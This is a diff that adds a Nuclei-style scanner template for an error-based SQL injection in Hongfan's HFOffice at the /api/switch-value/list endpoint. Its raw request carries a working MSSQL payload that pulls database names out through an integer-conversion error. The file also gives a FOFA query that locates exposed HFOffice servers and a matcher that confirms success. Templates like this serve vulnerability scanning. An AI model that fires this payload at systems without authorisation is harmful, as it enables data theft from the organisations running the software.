@@ -1,0 +1,41 @@
+id: hongfan-hfoffice-list-sqli
+
+info:
+  name: hongfan-hfoffice-list-sqli
+  author: known
+  severity: high
+  tags: hongfan,sqli
+  metadata:
+    fofa-qeury: body="./config/pc-app-config.js" && title="HFOffice"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        GET /api/switch-value/list?sorts=%5B%7B%22Field%22:%22convert(int,stuff(({{sqlserver}}),1,0,%27%27))%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c89905a7 HTTP/1.1
+        Host: 
+        Connection: close
+        Cache-Control: max-age=0
+        sec-ch-ua: '.Not/A)Brand';v='99', 'Google Chrome';v='103', 'Chromium';v='103'
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: 'Windows'
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+    payloads:
+      sqlserver:
+        - "select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27)"
+
+    matchers:     
+      - type: dsl
+        name: sqlserver
+        dsl:
+          - "status_code_1 == 400 && contains(body,'\u8f6c\u6362\u6210\u6570\u636e\u7c7b\u578b int \u65f6\u5931\u8d25') && contains(header,'text/plain')"
